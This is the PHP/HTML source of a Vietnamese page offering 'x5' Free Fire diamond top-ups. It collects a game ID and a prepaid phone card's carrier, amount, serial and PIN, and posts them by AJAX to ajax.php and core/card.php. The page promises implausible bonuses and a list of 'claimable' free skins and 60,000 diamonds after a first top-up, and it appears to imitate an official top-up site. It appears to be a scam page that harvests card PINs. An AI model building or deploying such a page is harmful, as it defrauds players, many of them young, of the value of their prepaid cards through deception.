<?php

include ('web.php');
include ('quanly/head.php');
?>
<body>
<script>
            $(document).ready(function() {
                $(".form-charge").submit(function (e) {

                    e.preventDefault();
                    $('#napthe').hide();
                    $('#loading').show();
                    $.ajax({
                        url: "core/card.php",
                        type: "POST",
                        dataType: "JSON",
                        data: $(".form-charge").serialize(),
                        success : function (data) {
                            if (data.err == 0) {
                                swal({
                                    title : "Hệ Thống",
                                     icon: "success",
                                    text: data.msg,
                                    button: "OK",
                                });
                            } else {
                                swal({
                                    title : "Hệ Thống",
                                    icon: "error",
                                    text: data.msg,
                                    button: "OK",
                                });
                            }
                            $('#loading').hide();
                            $('#napthe').show();
                              $("#load_hs").load("core/history.php");
                        }
                    });
                });
            });
            
            
        </script>
        


 
   <nav class="navbar navbar-expand-lg navbar-light bg-light">
  <div class="container-fluid">
    <a class="navbar-brand" href="/"><img src="IMG/pht.png" alt="" width="111" height="31"></a>
    <div class="collapse navbar-collapse" id="navbarText">
      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
      </ul>
      <span class="navbar-nav navbar-text">
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="#naptien"><i class="bi bi-person-circle me-2"></i>Đăng nhập</a>
        </li>
                <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="#naptien"></a>
        </li>
        
      </span>
    </div>
  </div>
</nav>
 <div class="loading"><div class="lds-hourglass"></div></div>
<div class="container mt-4">
  <div class="row justify-content-center">
      <div class="col-md-8" id="naptien">
           <div class="card">
  <div class="card-body py-5">
    <div class="row justify-content-center">
                 <div class="col-md-7 text-center">
          <img src="IMG/icon.png" class="mr-2" style="border-radius: 50%;width: 38px;"><b style="display: inline-block;margin-left: 10px;font-size: 20px;font-weight: 700;vertical-align: top;height: 40px;line-height: 40px;">NẠP KIM CƯƠNG X5</b>
         
         <br/><br/><br/>
         
         
         

    
    
    
          <form id="myform" method="post" accept-charset="UTF-8" class="form-charge">
    <input maxlength="64" class="oxVbmPqVSkCVx79GnnLc7" type="number" id="idgame" placeholder="Nhập ID Game Cần Nạp Kim Cương " />
    <div class="_3sYGlvN9b3AEZixLIfPEyv">
            </div>
            
             <br/>
                 <tr>
                                                 
                                                    <td>
                                                <select class="form-control" id="card_type">
                                                    <option value="">Chọn loại thẻ </option>
                                                        <option value="Viettel">VIETTEL</option>
                                                        <option value="Vinaphone">VINAPHONE</option>
                                                        <option value="Mobifone">MOBIFONE</option>
                                                    </select>
                                               

                                                    </td>
                                                </tr> 
                                                
                                                <br/>
                                                
                                                 <tr>
                                                    

                                                    <td>

                                                              <div class="form-group" style="width: 100%;">
                                               
                                            <select class="form-control" id="card_amount">
                                                 <option value="">Chọn Gói Kim Cương</option>
                                                <option value="50000">50,000 VND -Nhận lên đến 1.415 Kim Cương Free Fire</option>
                                                <option value="100000">100,000 VND -Nhận lên đến 3.020 Kim Cương Free Fire</option>
                                                <option value="200000">200,000 VND -Nhận lên đến 6.150 Kim Cương Free Fire</option>
                                                <option value="300000">300,000 VND -Nhận lên đến 9.500 Kim Cương Free Fire</option>
                                                <option value="500000">500,000 VND -Nhận lên đến 20.000 Kim Cương Free Fire </option>
                                                <option value="1000000">1,000,000 VND -Nhận lên đến 50.000 Kim Cương Free Fire </option>

                                                    </select>
                                                
                                              
                                                       
                                                    </td>
                                                </tr>
                                                 <br/>
                           <input maxlength="64" class="oxVbmPqVSkCVx79GnnLc7" type="number" id="serial" placeholder="Nhập số seri trên thẻ" />
    <div class="_3sYGlvN9b3AEZixLIfPEyv">
            </div> 
            
                                                             <br/>
                           <input maxlength="64" class="oxVbmPqVSkCVx79GnnLc7" type="number" id="pin" placeholder="Nhập Mã Thẻ In Sau Lớp Bạc Mỏng " />
    <div class="_3sYGlvN9b3AEZixLIfPEyv">
            </div> 
            
                                                
    <button class="_3duKww4d68rWsj1YAVEbYt mt-4" type="submit11" onclick="cmsntjzon()">Nạp Thẻ </button>
    
    
    

                                                 <script>
                                    function cmsntjzon() {
                                        var card_type = $("#card_type").val();
                                        var card_amount = $("#card_amount").val();
                                        var serial = $("#serial").val();
                                        var pin = $("#pin").val();
                                        var idgame = $("#idgame").val();

                                        if (!card_type || !card_amount || !serial || !pin || !idgame) {
                                            swal("Có Lỗi Xảy Ra", "Thông tin bạn nhập chưa đủ, vui lòng kiểm tra lại", "error");
                                        } else {
                                            $.ajax({
                                                type: "POST",
                                                url: "ajax.php",
                                                data: {
                                                    card_type,
                                                    card_amount,
                                                    serial,
                                                    pin,
                                                },
                                                dataType: "json",
                                                success: function (res) {
                                                    if (res.success) {
                                                        swal("Thành công", res.success, "success");
                                                    } else {
                                                        swal("Lỗi", res.error, "error");
                                                    }
                                                },
                                                error: function (err) {
                                                    console.log(err);
                                                },
                                            });
                                        }
                                    }
                                  </script>
                                            </tbody></table>
                                        </form>
    
    



 <div class="mb-3 mt-4">
                <div class="_1j8kr6gdyocMniz8cNt_4z"><img class="_2UFlTfk9EmoZAo0ZXXVu2W" src="IMG/qua.png" alt=""><div class="xredk3DIbsOZHLQIgFAc5"> Nhận quà miễn phí </div><div class="NAZifq9Yh9lpBiFhRgrDb"></div></div>
                <div class="mt-2">Vui lòng nạp lần đầu để nhận hết số quà bên dưới.</div>
              <table class="mt-3 table table-striped table-hover">
  <tbody>
       <tr>
      <td>Trọn bộ AN94 tia chớp</td>
      <td><b style="color:green;font-weight:500">Có thể nhận</b></td>
    </tr>
       <tr>
      <td>M1887 Hào Quang Vàng</td>
      <td><b style="color:green;font-weight:500">Có thể nhận</b></td>
    </tr>
      <tr>
      <td>60 000 kim cương</td>
      <td><b style="color:green;font-weight:500">Có thể nhận</b></td>
    </tr>
    <tr>
      <td>MP40 Bích Vàng</td>
      <td><b style="color:green;font-weight:500">Có thể nhận</b></td>
    </tr>
    <tr>
      <td>MP40 Thần Bài</td>
      <td><b style="color:green;font-weight:500">Có thể nhận</b></td>
    </tr>
    <tr>
      <td>MP40 Rô Lục</td>
      <td><b style="color:green;font-weight:500">Có thể nhận</b></td>
    </tr>
    <tr>
      <td>MP40 Cơ Đỏ</td>
      <td><b style="color:green;font-weight:500">Có thể nhận</b></td>
    </tr>
    <tr>
      <td>MP40 Chuồn Lam</td>
      <td><b style="color:green;font-weight:500">Có thể nhận</b></td>
    </tr>
  </tbody>
</table>
            </div>
        </div>
            </div>
  </div>
</div>
      </div>
  </div> <!-- TUẤN ORI IT -->
</div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-/bQdsTh/da6pkI1MST/rWKFNjaCP5gBSY4sEBT38Q/9RBh9AH40zEOg7Hlq2THRZ" crossorigin="anonymous"></script>

    <div class="container">
<?php
include ('quanly/pht_footer.php');
?>
</div>
  </body>
</html>


